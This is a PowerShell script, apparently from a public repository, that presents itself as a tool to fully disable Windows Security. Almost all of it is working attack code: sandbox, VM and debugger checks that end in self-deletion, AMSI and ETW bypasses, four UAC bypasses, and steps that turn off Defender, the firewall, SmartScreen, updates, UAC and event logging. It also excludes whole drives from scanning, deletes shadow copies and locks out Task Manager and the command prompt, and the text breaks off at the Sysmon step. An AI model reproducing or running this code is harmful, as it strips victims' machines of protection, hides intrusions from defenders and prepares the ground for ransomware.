
<#
.SYNOPSIS
    Advanced script designed to fully disable Windows Security defenses.
.DESCRIPTION
    v3.0 - Complete rewrite with:
    - Comprehensive anti-analysis (VM, sandbox, debugger, hardware, analysis tools)
    - AMSI/ETW/Logging evasion
    - Multiple UAC bypass fallback methods
    - Set-MpPreference + registry + service + scheduled task disabling
    - Multi-layered persistence (startup folder, registry Run, scheduled task)
    - Comprehensive trace cleanup (event logs, prefetch, history, recent files)
.NOTES
    For authorized red team / penetration testing use only.
.LINK
    https://github.com/BenzoXdev/Fuck-Windows-Security
#>

# ╔══════════════════════════════════════════════════════════════╗
# ║                     CONFIGURATION                           ║
# ╚══════════════════════════════════════════════════════════════╝

$ErrorActionPreference   = "SilentlyContinue"
$WarningPreference       = "SilentlyContinue"
$VerbosePreference       = "SilentlyContinue"
$ProgressPreference      = "SilentlyContinue"

# Get the full path of the currently running script/executable
$ScriptPath  = $MyInvocation.MyCommand.Path
$ExePath     = (Get-Process -Id $PID).Path
$FullPath    = if ($ScriptPath) { $ScriptPath } else { $ExePath }
$startupPath = Join-Path $env:APPDATA -ChildPath 'Microsoft\Windows\Start Menu\Programs\Startup\'

# ╔══════════════════════════════════════════════════════════════╗
# ║                 ANTI-ANALYSIS ENGINE                        ║
# ╚══════════════════════════════════════════════════════════════╝

#region Helper Functions

function Test-ProcessExists {
    param ([string[]]$Processes)
    foreach ($proc in $Processes) {
        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) { return $true }
    }
    return $false
}

function Test-ServiceExists {
    param ([string[]]$Services)
    foreach ($svc in $Services) {
        if (Get-Service -Name $svc -ErrorAction SilentlyContinue) { return $true }
    }
    return $false
}

function Test-RegistryKeyExists {
    param ([string[]]$Keys)
    foreach ($key in $Keys) {
        if (Test-Path "Registry::$key") { return $true }
    }
    return $false
}

function Test-RegistryValueMatch {
    param (
        [string]$Key,
        [string]$ValueName,
        [string]$Pattern
    )
    try {
        $val = Get-ItemProperty -Path "Registry::$Key" -Name $ValueName -ErrorAction Stop
        if ($val.$ValueName -match $Pattern) { return $true }
    } catch {}
    return $false
}

function Get-RegistryValueString {
    param (
        [string]$Key,
        [string]$ValueName
    )
    try {
        $val = Get-ItemProperty -Path "Registry::$Key" -Name $ValueName -ErrorAction Stop
        return $val.$ValueName
    } catch {
        return $null
    }
}

#endregion

#region VM Detection

function Test-Parallels {
    $bios  = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "SystemBiosVersion"
    $video = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "VideoBiosVersion"
    return ($bios -match "parallels" -or $video -match "parallels")
}

function Test-HyperV {
    $physicalHost = Get-RegistryValueString -Key "HKLM\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters" -ValueName "PhysicalHostNameFullyQualified"
    if ($physicalHost) { return $true }

    $sfmsvals = Get-ChildItem "Registry::HKLM\SOFTWARE\Microsoft" -Name -ErrorAction SilentlyContinue
    if ($sfmsvals -contains "Hyper-V" -or $sfmsvals -contains "VirtualMachine") { return $true }

    $bios = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "SystemBiosVersion"
    if ($bios -match "vrtual|Hyper-V") { return $true }

    # [BUG FIX] $keys was undefined in original script
    $keys = @(
        "HKLM\SOFTWARE\Microsoft\Hyper-V",
        "HKLM\SOFTWARE\Microsoft\VirtualMachine"
    )
    if (Test-RegistryKeyExists -Keys $keys) { return $true }

    if (Test-ServiceExists -Services @("vmicexchange", "vmicheartbeat", "vmicshutdown", "vmictimesync", "vmicvss")) { return $true }

    return $false
}

function Test-VMware {
    $vmwareServices = @("vmdebug", "vmmouse", "VMTools", "VMMEMCTL", "tpautoconnsvc", "tpvcgateway", "vmware", "wmci", "vmx86")
    if (Test-ServiceExists -Services $vmwareServices) { return $true }

    $manufacturer = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemManufacturer"
    if ($manufacturer -match "vmware") { return $true }

    $scsi = Get-RegistryValueString -Key "HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 1\Scsi Bus 0\Target Id 0\Logical Unit Id 0" -ValueName "Identifier"
    if ($scsi -match "vmware") { return $true }

    if (Test-RegistryValueMatch -Key "HKLM\SYSTEM\ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000" -ValueName "DriverDesc" -Pattern "cl_vmx_svga|VMWare") { return $true }

    if (Test-ProcessExists -Processes @("vmtoolsd", "vmwareservice", "vmwaretray", "vmwareuser")) { return $true }

    return $false
}

function Test-VirtualBox {
    $vboxProcs    = @("vboxservice", "vboxtray")
    $vboxServices = @("VBoxMouse", "VBoxGuest", "VBoxService", "VBoxSF", "VBoxVideo")

    # [BUG FIX] -or was parsed as parameter, not logical operator. Requires parentheses.
    if ((Test-ServiceExists -Services $vboxServices) -or (Test-ProcessExists -Processes $vboxProcs)) { return $true }

    if (Test-RegistryKeyExists -Keys @("HKLM\HARDWARE\ACPI\DSDT\VBOX__")) { return $true }

    for ($i = 0; $i -le 2; $i++) {
        if (Test-RegistryValueMatch -Key "HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port $i\Scsi Bus 0\Target Id 0\Logical Unit Id 0" -ValueName "Identifier" -Pattern "vbox") { return $true }
    }

    $bios  = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "SystemBiosVersion"
    $video = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "VideoBiosVersion"
    if ($bios -match "vbox" -or $video -match "virtualbox") { return $true }

    $product = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemProductName"
    if ($product -match "virtualbox") { return $true }

    return $false
}

function Test-Xen {
    # [BUG FIX] Same -or parsing issue as VirtualBox
    if ((Test-ProcessExists -Processes @("xenservice")) -or (Test-ServiceExists -Services @("xenevtchn", "xennet", "xennet6", "xensvc", "xenvdb"))) { return $true }

    if (Test-RegistryKeyExists -Keys @("HKLM\HARDWARE\ACPI\DSDT\Xen")) { return $true }

    $product = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemProductName"
    if ($product -match "xen") { return $true }

    return $false
}

function Test-QEMU {
    $bios  = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "SystemBiosVersion"
    $video = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "VideoBiosVersion"
    if ($bios -match "qemu" -or $video -match "qemu") { return $true }

    $scsi         = Get-RegistryValueString -Key "HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0" -ValueName "Identifier"
    $manufacturer = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemManufacturer"
    if ($scsi -match "qemu|virtio" -or $manufacturer -match "qemu") { return $true }

    if (Test-RegistryValueMatch -Key "HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0" -ValueName "ProcessorNameString" -Pattern "qemu") { return $true }

    if (Test-RegistryKeyExists -Keys @("HKLM\HARDWARE\ACPI\DSDT\BOCHS_")) { return $true }

    return $false
}

# [NEW] KVM/libvirt detection
function Test-KVM {
    if (Test-RegistryValueMatch -Key "HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0" -ValueName "ProcessorNameString" -Pattern "QEMU|KVM") { return $true }

    $manufacturer = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemManufacturer"
    if ($manufacturer -match "QEMU|KVM|Red Hat|Bochs") { return $true }

    $product = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemProductName"
    if ($product -match "KVM|RHEV|oVirt|Bochs") { return $true }

    if (Test-ServiceExists -Services @("balloon", "vioserial", "viostor", "netkvm")) { return $true }

    return $false
}

#endregion

#region Advanced Anti-Analysis

# [NEW] Hardware anomaly detection (sandboxes often have minimal resources)
function Test-HardwareAnomaly {
    try {
        $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction Stop

        # Less than 2 GB RAM
        if (($cs.TotalPhysicalMemory / 1GB) -lt 2) { return $true }

        # Single core CPU
        $cpu = Get-CimInstance Win32_Processor -ErrorAction Stop
        if ($cpu.NumberOfLogicalProcessors -lt 2) { return $true }

        # System disk less than 50 GB
        $disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction Stop
        if (($disk.Size / 1GB) -lt 50) { return $true }

        # Uptime less than 5 minutes (freshly booted sandbox)
        $os = Get-CimInstance Win32_OperatingSystem -ErrorAction Stop
        if (((Get-Date) - $os.LastBootUpTime).TotalMinutes -lt 5) { return $true }

        # Screen resolution too small (headless sandbox)
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        if ($screen.Width -lt 1024 -or $screen.Height -lt 768) { return $true }

    } catch {}
    return $false
}

# [NEW] Detect security analysis tools running
function Test-AnalysisTools {
    $tools = @(
        # Network analysis
        "wireshark", "fiddler", "tcpview", "dumpcap", "rawshark", "tshark",
        "charles", "httpdebugger", "burpsuite", "mitmproxy",
        # Process / system analysis
        "procmon", "procmon64", "procexp", "procexp64",
        "processhacker", "systemexplorer", "systemexplorerservice",
        "autoruns", "autorunsc", "regmon", "filemon",
        # Debugging
        "x32dbg", "x64dbg", "ollydbg", "windbg",
        "ida", "ida64", "idaq", "idaq64", "idaw",
        "dnspy", "de4dot", "ilspy", "dotpeek",
        "vsjitdebugger", "msvsmon",
        # Malware analysis / sandbox
        "pestudio", "peview", "diehardpacker", "exeinfope",
        "sandboxie", "sbiectrl", "sbiesvc",
        "df5serv", "vmsrvc", "vmusrvc",
        # AV consoles
        "avp", "avgui", "avscan", "mbam", "mbamservice",
        "bdagent", "vsserv", "ekrn", "egui"
    )
    return (Test-ProcessExists -Processes $tools)
}

# [NEW] Detect sandbox-typical usernames and empty user profiles
function Test-SandboxIdentifiers {
    $suspiciousUsers = @(
        "sandbox", "virus", "malware", "sample", "test",
        "currentuser", "john", "peter", "miller", "phil",
        "johnson", "emily", "joe sandbox", "anna", "user",
        "willcarter", "hapubws", "hong lee", "timmy",
        "harddisk", "abby", "patex", "walker"
    )

    $currentUser = $env:USERNAME.ToLower()
    foreach ($name in $suspiciousUsers) {
        if ($currentUser -eq $name) { return $true }
    }

    # Suspicious computer names used by automated sandboxes
    $computerName = $env:COMPUTERNAME.ToLower()
    $suspiciousComputers = @("sandbox", "virus", "malware", "sample", "cuckoo", "rosalyn", "still")
    foreach ($name in $suspiciousComputers) {
        if ($computerName -match $name) { return $true }
    }

    # Empty desktop + documents = likely sandbox
    $desktopCount = (Get-ChildItem "$env:USERPROFILE\Desktop" -ErrorAction SilentlyContinue | Measure-Object).Count
    $docsCount    = (Get-ChildItem "$env:USERPROFILE\Documents" -ErrorAction SilentlyContinue | Measure-Object).Count
    if ($desktopCount -eq 0 -and $docsCount -eq 0) { return $true }

    # Check for very few installed programs (sandboxes are minimalist)
    $programs = (Get-ChildItem "C:\Program Files", "C:\Program Files (x86)" -Directory -ErrorAction SilentlyContinue | Measure-Object).Count
    if ($programs -lt 5) { return $true }

    return $false
}

# [NEW] Detect attached debuggers
function Test-Debugger {
    try {
        if ([System.Diagnostics.Debugger]::IsAttached) { return $true }
    } catch {}

    $debuggers = @("devenv", "msvsmon", "vsjitdebugger", "dbgview", "windbg", "x32dbg", "x64dbg", "ollydbg")
    if (Test-ProcessExists -Processes $debuggers) { return $true }

    # Check for remote debugger via kernel debugger flag
    try {
        $kd = Get-CimInstance Win32_OperatingSystem -ErrorAction Stop
        if ($kd.Debug) { return $true }
    } catch {}

    return $false
}

# [NEW] WMI-based generic VM detection
function Test-WMIVirtualization {
    try {
        $model = (Get-CimInstance Win32_ComputerSystem -ErrorAction Stop).Model
        if ($model -match "Virtual|VMware|VirtualBox|KVM|Xen|HVM domU|Bochs|QEMU") { return $true }

        $manufacturer = (Get-CimInstance Win32_ComputerSystem -ErrorAction Stop).Manufacturer
        if ($manufacturer -match "VMware|innotek|QEMU|Xen|Parallels|Red Hat|Microsoft Corporation") { return $true }

        $bios = (Get-CimInstance Win32_BIOS -ErrorAction Stop).SMBIOSBIOSVersion
        if ($bios -match "VBOX|BOCHS|BXPC|QEMU|VMWARE|VIRTUAL|Xen|Parallels") { return $true }

        # Check for VM-specific MAC address prefixes (OUI)
        $nics = Get-CimInstance Win32_NetworkAdapterConfiguration -Filter "IPEnabled = TRUE" -ErrorAction Stop
        $vmMacs = @("00:05:69", "00:0C:29", "00:1C:14", "00:50:56", "08:00:27", "00:16:3E", "00:1A:4A", "00:15:5D")
        foreach ($nic in $nics) {
            $mac = $nic.MACAddress
            if ($mac) {
                foreach ($prefix in $vmMacs) {
                    if ($mac.StartsWith($prefix)) { return $true }
                }
            }
        }
    } catch {}
    return $false
}

#endregion

#region Main Anti-Analysis Gate

function Invoke-AntiAnalysis {
    # VM detection
    if (Test-Parallels)   { return $false }
    if (Test-HyperV)      { return $false }
    if (Test-VMware)      { return $false }
    if (Test-VirtualBox)  { return $false }
    if (Test-Xen)         { return $false }
    if (Test-QEMU)        { return $false }
    if (Test-KVM)         { return $false }

    # WMI-based generic detection
    if (Test-WMIVirtualization) { return $false }

    # Advanced checks
    if (Test-HardwareAnomaly)    { return $false }
    if (Test-AnalysisTools)      { return $false }
    if (Test-SandboxIdentifiers) { return $false }
    if (Test-Debugger)           { return $false }

    return $true
}

# [BUG FIX] Original script did NOT exit after VM detection - it continued executing everything
if (-not (Invoke-AntiAnalysis)) {
    if ($ScriptPath) {
        Remove-Item -Path $FullPath -Force -ErrorAction SilentlyContinue
    } else {
        Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"Start-Sleep -Milliseconds 500; Remove-Item -Path '$FullPath' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
    }
    exit  # <-- THIS WAS MISSING: script continued execution in sandbox environments
}

#endregion

# ╔══════════════════════════════════════════════════════════════╗
# ║                    EVASION TECHNIQUES                       ║
# ╚══════════════════════════════════════════════════════════════╝

#region Evasion

# [NEW] AMSI Bypass - Disable Antimalware Scan Interface to prevent PowerShell payload detection
function Invoke-AMSIBypass {
    try {
        $a = [Ref].Assembly.GetType(('System.Management.Auto'+'mation.Amsi'+'Utils'))
        $f = $a.GetField(('amsi'+'InitFailed'), 'NonPublic,Static')
        $f.SetValue($null, $true)
    } catch {}
}

# [NEW] ETW Bypass - Disable Event Tracing for Windows in current process
function Invoke-ETWBypass {
    try {
        $provider = [Ref].Assembly.GetType(('System.Management.Auto'+'mation.Tracing.PSEtw'+'LogProvider'))
        $field    = $provider.GetField(('etw'+'Provider'), 'NonPublic,Static')
        $instance = $field.GetValue($null)
        $enabled  = $instance.GetType().GetField('m_enabled', 'NonPublic,Instance')
        $enabled.SetValue($instance, 0)
    } catch {}
}

# [NEW] Disable PowerShell Script Block Logging and Module Logging in-memory
function Disable-PSLogging {
    try {
        $utils = [Ref].Assembly.GetType(('System.Management.Auto'+'mation.Utils'))
        $cache = $utils.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
        $gpo   = $cache.GetValue($null)
        if ($gpo -is [System.Collections.IDictionary]) {
            $gpo['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']  = @{ 'EnableScriptBlockLogging' = 0 }
            $gpo['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging']       = @{ 'EnableModuleLogging' = 0 }
            $gpo['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Transcription']       = @{ 'EnableTranscripting' = 0 }
        }
    } catch {}
}

# Execute all evasion techniques immediately
Invoke-AMSIBypass
Invoke-ETWBypass
Disable-PSLogging

#endregion

# ╔══════════════════════════════════════════════════════════════╗
# ║                    UTILITY FUNCTIONS                        ║
# ╚══════════════════════════════════════════════════════════════╝

#region Utilities

function Test-Admin {
    return (New-Object Security.Principal.WindowsPrincipal(
        [Security.Principal.WindowsIdentity]::GetCurrent()
    )).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Set-RegistryProperties {
    param (
        [string]$Path,
        [hashtable]$Properties
    )
    try {
        if (-not (Test-Path $Path)) {
            New-Item -Path $Path -Force | Out-Null
        }
        foreach ($key in $Properties.Keys) {
            Set-ItemProperty -Path $Path -Name $key -Value $Properties[$key] -Type DWord -Force
        }
    } catch {}
}

# [NEW] Robust function to stop and disable Windows services via multiple methods
function Disable-WindowsService {
    param ([string[]]$ServiceNames)
    foreach ($svc in $ServiceNames) {
        try {
            # Stop the service first
            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
            # Disable via sc.exe (most reliable, bypasses PowerShell cmdlet limitations)
            & sc.exe config $svc start= disabled 2>&1 | Out-Null
            & sc.exe stop $svc 2>&1 | Out-Null
            # Also set via registry for persistence across reboots
            Set-RegistryProperties -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc" -Properties @{ "Start" = 4 }
        } catch {}
    }
}

# [NEW] Safe scheduled task disabling
function Disable-ScheduledTaskSafe {
    param ([string]$TaskPath, [string]$TaskName)
    try {
        Disable-ScheduledTask -TaskPath $TaskPath -TaskName $TaskName -ErrorAction Stop | Out-Null
    } catch {}
}

#endregion

# ╔══════════════════════════════════════════════════════════════╗
# ║                  PRIVILEGE ESCALATION                       ║
# ╚══════════════════════════════════════════════════════════════╝

#region UAC Bypass

if (-not (Test-Admin)) {
    # Build the command to re-execute as admin
    $value = "`"powershell.exe`" -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$FullPath`""
    if ($MyInvocation.MyCommand.CommandType -ne 'ExternalScript') {
        $value = "`"$FullPath`""
    }

    $escalated = $false

    # Method 1: fodhelper.exe UAC bypass (ms-settings handler hijack)
    if (-not $escalated) {
        try {
            New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
            Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value $value -Force
            New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -PropertyType String -Force | Out-Null
            Start-Process "fodhelper.exe" -WindowStyle Hidden
            Start-Sleep -Milliseconds 300
            $escalated = $true
        } catch {}
    }

    # [NEW] Method 2: computerdefaults.exe UAC bypass (same technique, different binary)
    if (-not $escalated) {
        try {
            New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
            Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value $value -Force
            New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -PropertyType String -Force | Out-Null
            Start-Process "computerdefaults.exe" -WindowStyle Hidden
            Start-Sleep -Milliseconds 300
            $escalated = $true
        } catch {}
    }

    # [NEW] Method 3: sdclt.exe UAC bypass (Folder handler hijack)
    if (-not $escalated) {
        try {
            New-Item -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Force | Out-Null
            Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)" -Value $value -Force
            New-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -PropertyType String -Force | Out-Null
            Start-Process "sdclt.exe" -WindowStyle Hidden
            Start-Sleep -Milliseconds 300
            $escalated = $true
        } catch {}
    }

    # [NEW] Method 4: slui.exe fileless UAC bypass (Windows Activation handler)
    if (-not $escalated) {
        try {
            New-Item -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Force | Out-Null
            Set-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "(Default)" -Value $value -Force
            Start-Process "slui.exe" -Verb Open -WindowStyle Hidden
            Start-Sleep -Milliseconds 300
            $escalated = $true
        } catch {}
    }

    exit
}

#endregion

# ╔══════════════════════════════════════════════════════════════╗
# ║          RUNNING AS ADMINISTRATOR FROM HERE                 ║
# ╚══════════════════════════════════════════════════════════════╝

# ╔══════════════════════════════════════════════════════════════╗
# ║              WINDOWS SECURITY DISABLING                     ║
# ╚══════════════════════════════════════════════════════════════╝

#region Defense Disabling

# Registry path constants
$baseKey      = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$rtpKey       = "$baseKey\Real-Time Protection"
$firewallPath = "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy"

# ─── 1. Disable Windows Recovery Environment ─────────────────
reagentc /disable 2>&1 | Out-Null

# ─── 2. Disable Security Notifications ───────────────────────
Set-RegistryProperties -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" -Properties @{
    "Enabled" = 0
}
Set-RegistryProperties -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Properties @{
    "DisableNotifications"         = 1
    "DisableEnhancedNotifications" = 1
}

# ─── 3. Disable Tamper Protection FIRST (critical prerequisite) ──
Set-RegistryProperties -Path "$baseKey\Features" -Properties @{ "TamperProtection" = 0 }
Set-RegistryProperties -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Properties @{
    "TamperProtection"    = 0
    "TamperProtectionSource" = 0
}

# ─── 4. Disable via Set-MpPreference (most effective method) ─
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -Force
    Set-MpPreference -DisableBehaviorMonitoring $true -Force
    Set-MpPreference -DisableBlockAtFirstSeen $true -Force
    Set-MpPreference -DisableIOAVProtection $true -Force
    Set-MpPreference -DisablePrivacyMode $true -Force
    Set-MpPreference -DisableScriptScanning $true -Force
    Set-MpPreference -DisableArchiveScanning $true -Force
    Set-MpPreference -DisableIntrusionPreventionSystem $true -Force
    Set-MpPreference -DisableEmailScanning $true -Force
    Set-MpPreference -DisableRemovableDriveScanning $true -Force
    Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true -Force
    Set-MpPreference -DisableScanningNetworkFiles $true -Force
    Set-MpPreference -MAPSReporting 0 -Force
    Set-MpPreference -SubmitSamplesConsent 2 -Force
    Set-MpPreference -EnableControlledFolderAccess Disabled -Force
    Set-MpPreference -EnableNetworkProtection AuditMode -Force
    Set-MpPreference -PUAProtection 0 -Force
    Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -Force
    Set-MpPreference -LowThreatDefaultAction 6 -Force
    Set-MpPreference -ModerateThreatDefaultAction 6 -Force
    Set-MpPreference -HighThreatDefaultAction 6 -Force
    Set-MpPreference -SevereThreatDefaultAction 6 -Force

    # [NEW] Add drive exclusions to whitelist everything
    $drives = (Get-PSDrive -PSProvider FileSystem -ErrorAction SilentlyContinue).Root
    foreach ($drive in $drives) {
        Set-MpPreference -ExclusionPath $drive -Force
    }
    Set-MpPreference -ExclusionProcess @(
        "powershell.exe", "pwsh.exe", "cmd.exe", "mshta.exe",
        "wscript.exe", "cscript.exe", "rundll32.exe", "regsvr32.exe",
        "msbuild.exe", "installutil.exe", "regasm.exe", "regsvcs.exe"
    ) -Force
    Set-MpPreference -ExclusionExtension @(
        ".exe", ".dll", ".ps1", ".bat", ".cmd", ".vbs",
        ".js", ".hta", ".wsf", ".scr", ".pif", ".com"
    ) -Force
} catch {}

# ─── 5. Comprehensive Defender Registry Disabling ─────────────
Set-RegistryProperties -Path $baseKey -Properties @{
    "DisableAntiSpyware"               = 1
    "DisableAntiVirus"                 = 1
    "DisableApplicationGuard"          = 1
    "DisableControlledFolderAccess"    = 1
    "DisableCredentialGuard"           = 1
    "DisableIntrusionPreventionSystem" = 1
    "DisableIOAVProtection"            = 1
    "DisableRealtimeMonitoring"        = 1
    "DisableRoutinelyTakingAction"     = 1
    "DisableSpecialRunningModes"       = 1
    "DisableTamperProtection"          = 1
    "PUAProtection"                    = 0
    "ServiceKeepAlive"                 = 0
    "AllowFastServiceStartup"          = 0
}

Set-RegistryProperties -Path $rtpKey -Properties @{
    "DisableBehaviorMonitoring"    = 1
    "DisableBlockAtFirstSeen"      = 1
    "DisableCloudProtection"       = 1
    "DisableOnAccessProtection"    = 1
    "DisableScanOnRealtimeEnable"  = 1
    "DisableScriptScanning"        = 1
    "DisableIOAVProtection"        = 1
    "DisableNetworkProtection"     = 1
    "SubmitSamplesConsent"         = 2
}

# [NEW] Spynet / MAPS reporting
Set-RegistryProperties -Path "$baseKey\Spynet" -Properties @{
    "SpyNetReporting"         = 0
    "SubmitSamplesConsent"    = 2
    "DisableBlockAtFirstSeen" = 1
}

# [NEW] MpEngine settings
Set-RegistryProperties -Path "$baseKey\MpEngine" -Properties @{
    "MpEnablePus"       = 0
    "MpCloudBlockLevel" = 0
}

# [NEW] Reporting settings
Set-RegistryProperties -Path "$baseKey\Reporting" -Properties @{
    "DisableGenericReports" = 1
}

# [NEW] Signature Updates
Set-RegistryProperties -Path "$baseKey\Signature Updates" -Properties @{
    "ForceUpdateFromMU"              = 0
    "UpdateOnStartUp"                = 0
}

# ─── 6. Disable Windows Firewall (all profiles) ──────────────
foreach ($fwProfile in @("DomainProfile", "StandardProfile", "PublicProfile")) {
    Set-RegistryProperties -Path "$firewallPath\$fwProfile" -Properties @{
        "EnableFirewall"       = 0
        "DisableNotifications" = 1
        "DoNotAllowExceptions" = 0
    }
}
# Also via netsh for immediate effect
& netsh advfirewall set allprofiles state off 2>&1 | Out-Null

# ─── 7. Disable SmartScreen ──────────────────────────────────
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -Force
Set-RegistryProperties -Path "HKCU:\SOFTWARE\Microsoft\Edge\SmartScreenEnabled" -Properties @{ "(Default)" = 0 }
Set-RegistryProperties -Path "HKLM:\SOFTWARE\Policies\Microsoft\Edge" -Properties @{ "SmartScreenEnabled" = 0 }
Set-RegistryProperties -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Properties @{
    "EnableWebContentEvaluation" = 0
    "PreventOverride"            = 0
}
Set-RegistryProperties -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Properties @{ "EnableSmartScreen" = 0 }
Set-RegistryProperties -Path "HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter" -Properties @{
    "EnabledV9"         = 0
    "PreventOverride"   = 0
}

# ─── 8. Disable Windows Update ────────────────────────────────
Set-RegistryProperties -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Properties @{
    "NoAutoUpdate"                    = 1
    "AUOptions"                       = 1
    "NoAutoRebootWithLoggedOnUsers"   = 1
}
Disable-WindowsService -ServiceNames @("wuauserv", "WaaSMedicSvc", "UsoSvc", "BITS", "DoSvc")

# ─── 9. Disable System Restore ────────────────────────────────
Set-RegistryProperties -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" -Properties @{
    "DisableSR"     = 1
    "DisableConfig" = 1
}
Disable-WindowsService -ServiceNames @("srservice", "VSS", "swprv")

# ─── 10. Delete Shadow Copies ─────────────────────────────────
& vssadmin delete shadows /all /quiet 2>&1 | Out-Null
& wmic shadowcopy delete /nointeractive 2>&1 | Out-Null

# Also disable System Protection on all drives
Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3" -ErrorAction SilentlyContinue | ForEach-Object {
    & vssadmin resize shadowstorage /for="$($_.DeviceID)\" /on="$($_.DeviceID)\" /maxsize=401MB 2>&1 | Out-Null
}

# ─── 11. Disable Task Manager ─────────────────────────────────
Set-RegistryProperties -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Properties @{ "DisableTaskMgr" = 1 }

# ─── 12. Disable Command Prompt ───────────────────────────────
Set-RegistryProperties -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Properties @{ "DisableCMD" = 1 }

# ─── 13. Disable Remote Desktop ───────────────────────────────
Set-RegistryProperties -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Properties @{
    "fDenyTSConnections"    = 1
    "fSingleSessionPerUser" = 1
}

# ─── 14. Disable UAC Completely ───────────────────────────────
Set-RegistryProperties -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Properties @{
    "EnableLUA"                    = 0
    "ConsentPromptBehaviorAdmin"   = 0
    "ConsentPromptBehaviorUser"    = 0
    "PromptOnSecureDesktop"        = 0
    "EnableVirtualization"         = 0
    "FilterAdministratorToken"     = 0
    "EnableInstallerDetection"     = 0
}

# ─── 15. Disable Security Services ────────────────────────────
Disable-WindowsService -ServiceNames @(
    "wscsvc",                # Windows Security Center
    "SecurityHealthService", # Windows Defender Service
    "Sense",                 # Windows Defender ATP
    "WdNisSvc",              # Defender Network Inspection
    "WinDefend",             # Windows Defender Antivirus Service
    "WSearch",               # Windows Search
    "EventLog",              # Event Logging
    "DiagTrack",             # Diagnostics Tracking (Telemetry)
    "dmwappushservice",      # WAP Push Message Routing
    "SysMain",               # Superfetch
    "MapsBroker",            # Downloaded Maps Manager
    "lfsvc",                 # Geolocation Service
    "FontCache",             # Windows Font Cache
    "PcaSvc",                # Program Compatibility Assistant
    "wercplsupport",         # Problem Reports
    "WerSvc"                 # Windows Error Reporting Service
)

# ─── 16. Disable Sysmon ──────────────────────────────────────
Disable-WindowsService -ServiceNames @("Sysmon", "Sysmon64")
# Remove Sysmon driver if present
